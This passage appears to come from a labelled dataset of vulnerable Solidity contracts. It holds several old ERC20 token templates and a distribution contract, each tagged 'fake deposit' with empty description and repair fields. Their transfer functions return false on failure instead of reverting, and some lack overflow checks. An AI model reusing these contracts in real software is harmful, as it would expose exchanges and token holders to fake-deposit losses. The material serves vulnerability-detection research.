balances[msg.sender] = balances[msg.sender] + amount;\r\n\r\n        Transfer(fundsWallet, msg.sender, amount); \r\n\r\n        fundsWallet.transfer(msg.value);                               \r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n       \r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract PATPAT is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = '1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function PATPAT(\r\n        ) {\r\n        balances[msg.sender] = 200000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 200000000;                        // Update total supply (100000 for example)\r\n        name = \"PATPAT\";                                   // Set the name for display purposes\r\n        decimals = 2;                            // Amount of decimals for display purposes\r\n        symbol = \"PATPAT\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'TP1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 45000000000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 45000000000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"True Patriot\";                                   // Set the name for display purposes\r\n        decimals = 18;                            // Amount of decimals for display purposes\r\n        symbol = \"TPAT\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n    string public name;                   //Name of the token\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals\r\n    string public symbol;                 //An identifier: eg AXM\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 1000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 1000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"OAK\";                                   // Set the name for display purposes\r\n        decimals = 8;                            // Amount of decimals\r\n        symbol = \"OAK\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.24;\r\n\r\nlibrary SafeMath {\r\n    function add(\r\n        uint256 a,\r\n        uint256 b)\r\n        internal\r\n        pure\r\n        returns(uint256 c)\r\n    {\r\n        c = a + b;\r\n        require(c >= a);\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b)\r\n        internal\r\n        pure\r\n        returns(uint256 c)\r\n    {\r\n        require(b <= a);\r\n        c = a - b;\r\n    }\r\n\r\n    function mul(\r\n        uint256 a,\r\n        uint256 b)\r\n        internal\r\n        pure\r\n        returns(uint256 c) {\r\n        c = a * b;\r\n        require(a == 0 || c / a == b);\r\n    }\r\n    \r\n     function div(\r\n        uint256 a,\r\n        uint256 b)\r\n        internal\r\n        pure\r\n        returns(uint256 c) {\r\n        require(b > 0);\r\n        c = a / b;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    // ERC20 Optional Views\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n\r\n    // Views\r\n    function totalSupply() external view returns (uint);\r\n\r\n    function balanceOf(address owner) external view returns (uint);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n\r\n    // Mutative functions\r\n    function transfer(address to, uint value) external returns (bool);\r\n\r\n    function approve(address spender, uint value) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint value\r\n    ) external returns (bool);\r\n\r\n    // Events\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\n\r\n// https://docs.synthetix.io/contracts/source/contracts/owned\r\ncontract Owned {\r\n    address public owner;\r\n    address public nominatedOwner;\r\n\r\n    constructor(address _owner) public {\r\n        require(_owner != address(0), \"Owner address cannot be 0\");\r\n        owner = _owner;\r\n        emit OwnerChanged(address(0), _owner);\r\n    }\r\n\r\n    function nominateNewOwner(address _owner) external onlyOwner {\r\n        nominatedOwner = _owner;\r\n        emit OwnerNominated(_owner);\r\n    }\r\n\r\n    function acceptOwnership() external {\r\n        require(msg.sender == nominatedOwner, \"You must be nominated before you can accept ownership\");\r\n        emit OwnerChanged(owner, nominatedOwner);\r\n        owner = nominatedOwner;\r\n        nominatedOwner = address(0);\r\n    }\r\n\r\n    modifier onlyOwner {\r\n        _onlyOwner();\r\n        _;\r\n    }\r\n\r\n    function _onlyOwner() private view {\r\n        require(msg.sender == owner, \"Only the contract owner may perform this action\");\r\n    }\r\n\r\n    event OwnerNominated(address newOwner);\r\n    event OwnerChanged(address oldOwner, address newOwner);\r\n}\r\n\r\ncontract Pausable is Owned {\r\n  event Pause();\r\n  event Unpause();\r\n\r\n  bool public paused = false;\r\n\r\n  modifier whenNotPaused() {\r\n    require(!paused);\r\n    _;\r\n  }\r\n\r\n  modifier whenPaused() {\r\n    require(paused);\r\n    _;\r\n  }\r\n\r\n  function pause() onlyOwner whenNotPaused public {\r\n    paused = true;\r\n    emit Pause();\r\n  }\r\n\r\n  function unpause() onlyOwner whenPaused public {\r\n    paused = false;\r\n    emit Unpause();\r\n  }\r\n}\r\n\r\n\r\n\r\n\r\npragma solidity >=0.4.24;\r\n\r\ncontract IDODistribution is Owned, Pausable {\r\n    \r\n    using SafeMath for uint;\r\n\r\n    /**\r\n     * @notice Authorised address able to call batchDeposit\r\n     */\r\n    address public authority;\r\n\r\n    /**\r\n     * @notice Address of ERC20 token\r\n     */\r\n    address public erc20Address;\r\n\r\n\r\n    mapping(address => uint) balances;\r\n    mapping(address => uint) counts;\r\n\r\n    uint public totalSupply;\r\n\r\n    constructor(\r\n        address _owner,\r\n        address _authority\r\n    ) public Owned(_owner) {\r\n        authority = _authority;\r\n    }\r\n\r\n    function balanceOf(address _address) public view returns (uint) {\r\n        return balances[_address];\r\n    }\r\n\r\n    function depositNumberOf(address _address) public view returns (uint) {\r\n        return counts[_address];\r\n    }\r\n\r\n    // ========== EXTERNAL SETTERS ==========\r\n\r\n    function setTokenAddress(address _erc20Address) public onlyOwner {\r\n        erc20Address = _erc20Address;\r\n    }\r\n\r\n    /**\r\n     * @notice Set the address of the contract authorised to call distributeReward()\r\n     * @param _authority Address of the authorised calling contract.\r\n     */\r\n    function setAuthority(address _authority) public onlyOwner {\r\n        authority = _authority;\r\n    }\r\n\r\n    function batchDeposit(address[] destinations, uint[] amounts) public returns (bool) {\r\n        require(msg.sender == authority, \"Caller is not authorized\");\r\n        require(erc20Address != address(0), \"erc20 token address is not set\");\r\n        require(destinations.length == amounts.length, \"length of inputs not match\");\r\n\r\n        // we don't need check amount[i] > 0 or destinations != 0x0 because they cannot claim anyway\r\n        uint amount = 0;\r\n        for (uint i = 0; i < amounts.length; i++) {\r\n            amount = amount.add(amounts[i]);\r\n            balances[destinations[i]] =  balances[destinations[i]].add(amounts[i]);\r\n            counts[destinations[i]] += 1;\r\n        }\r\n\r\n        totalSupply = totalSupply.add(amount);\r\n\r\n        emit TokenDeposit(amount);\r\n        return true;\r\n    }\r\n\r\n    function claim() public whenNotPaused returns (bool) {\r\n        require(erc20Address != address(0), \"erc20 token address is not set\");\r\n        require(balances[msg.sender] > 0, \"account balance is zero\");\r\n\r\n        uint _amount = balances[msg.sender];\r\n        require(\r\n            IERC20(erc20Address).balanceOf(address(this)) >= _amount,\r\n            \"This contract does not have enough tokens to distribute\"\r\n        );\r\n\r\n        balances[msg.sender] = 0;\r\n        IERC20(erc20Address).transfer(msg.sender, _amount);\r\n        totalSupply = totalSupply.sub(_amount);\r\n\r\n        emit UserClaimed(msg.sender, _amount);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address _address, uint _amount) public returns (bool) {\r\n        require(msg.sender == authority, \"Caller is not authorized\");\r\n        require(erc20Address != address(0), \"erc20 token address is not set\");\r\n        require(\r\n            IERC20(erc20Address).balanceOf(address(this)) >= _amount,\r\n            \"This contract does not have enough tokens to distribute\"\r\n        );\r\n        IERC20(erc20Address).transfer(_address, _amount);\r\n        return true;\r\n\r\n    }\r\n\r\n    /* ========== Events ========== */\r\n    event TokenDeposit(uint _amount);\r\n    event UserClaimed(address _address, uint _amount);\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.5.0;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP. Does not include\r\n * the optional functions; to access them see {ERC20Detailed}.\r\n */\r\ninterface ERC20Interface {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract ERC20Base is ERC20Interface {\r\n    // Empty internal constructor, to prevent people from mistakenly deploying\r\n    // an instance of this contract, which should be used via inheritance.\r\n    // constructor () internal { }\r\n    // solhint-disable-previous-line no-empty-blocks\r\n\r\n    mapping (address => uint256) public _balances;\r\n    mapping (address => mapping (address => uint256)) public _allowances;\r\n    uint256 public _totalSupply;\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (_balances[msg.sender] >= _value && _value > 0) {\r\n            _balances[msg.sender] -= _value;\r\n            _balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { \r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\r\n            _balances[_to] += _value;\r\n            _balances[_from] -= _value;\r\n            _allowances[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return _balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        _allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n      return _allowances[_owner][_spender];\r\n    }\r\n    \r\n    function totalSupply() public view returns (uint256 total) {\r\n        return _totalSupply;\r\n    }\r\n}\r\n\r\ncontract ProMind is ERC20Base {\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    \r\n    constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n        _totalSupply = initialSupply *  10  ** uint256(decimals);\r\n        _balances[msg.sender] = initialSupply  *  10  ** uint256(decimals);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei.\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
